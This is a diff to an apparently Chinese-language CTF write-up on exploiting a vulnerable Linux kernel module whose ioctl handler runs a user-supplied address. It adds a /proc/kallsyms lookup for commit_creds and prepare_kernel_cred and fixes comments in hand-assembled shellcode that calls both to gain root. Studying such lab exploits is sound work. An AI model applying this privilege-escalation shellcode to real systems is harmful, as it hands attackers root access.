@@ -264,7 +264,7 @@ int main(int argc, char *argv[]) {
 
 ## Write-up
 
-`device_ioctl` 把 `arg` 当函数执行了，由于没开 kaslr, 所以可以直接通过 `lsmod` 得到 module 的加载基地址，用它加上模块内函数地址作为 `arg` 传入即可。
+`device_ioctl` 把 `arg` 当函数执行了，由于没开 kASLR, 所以可以直接通过 `lsmod` 得到 module 的加载基地址，用它加上模块内函数地址作为 `arg` 传入即可。
 
 ```c
 __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
@@ -340,6 +340,12 @@ ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, l
 }
 ```
 
+```shellsession
+~ # cat /proc/kallsyms | grep "prepare_kernel_cred\|commit_creds"
+ffffffff81089310 T commit_creds
+ffffffff81089660 T prepare_kernel_cred
+```
+
 注意 `call` 指令需要指定返回到哪里，否则会跑飞。
 
 ## Exploit
@@ -358,7 +364,7 @@ int main(int argc, char *argv[]) {
       "\xff\xd0"                     // call rax (prepare_kernel_cred)
       "\x48\x89\xc7"                 // mov rdi, rax
       "\x48\xc7\xc0\x10\x93\x08\x81" // mov rax, 0xffffffff81089310
-      "\xff\xd0"                     // jmp rax (commit_creds)
+      "\xff\xd0"                     // call rax (commit_creds)
       "\xc3";                        // ret
 
   write(fd, sc, sizeof(sc));
